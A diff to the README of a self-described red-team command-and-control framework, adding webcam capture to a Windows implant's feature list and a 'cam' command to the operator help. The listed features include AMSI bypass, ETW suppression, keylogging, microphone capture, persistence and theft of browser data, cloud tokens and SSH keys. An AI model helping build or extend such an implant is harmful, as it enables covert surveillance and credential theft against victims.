@@ -2,7 +2,7 @@
 
 > Red-team C2 framework: Windows-implant agent (WebSocket-over-TLS,
 > AES-256-GCM session crypto, HMAC-SHA-256 registration, AMSI bypass,
-> ETW suppression, keylogger, mic capture, registry + scheduled-task persistence,
+> ETW suppression, keylogger, mic capture, webcam capture, registry + scheduled-task persistence,
 > screenshot, process list, clipboard, file search, browser / WiFi /
 > cloud-token / SSH-key exfil, EDR/AV recon, Telegram backup channel,
 > exfil) and a multi-agent operator console.
@@ -220,6 +220,7 @@ Commands:
   download/dl <id> <path>        - download file from agent
   upload/up <id> <remotepath> <base64>
   screenshot/ss <id>             - take screenshot
+  cam <id> [device]              - capture from default webcam (or device N) -> downloads/cam_<ts>.bmp
   ps <id>                        - list processes on agent
   clip <id>                      - get clipboard
   find <id> <path>;<mask>        - find files
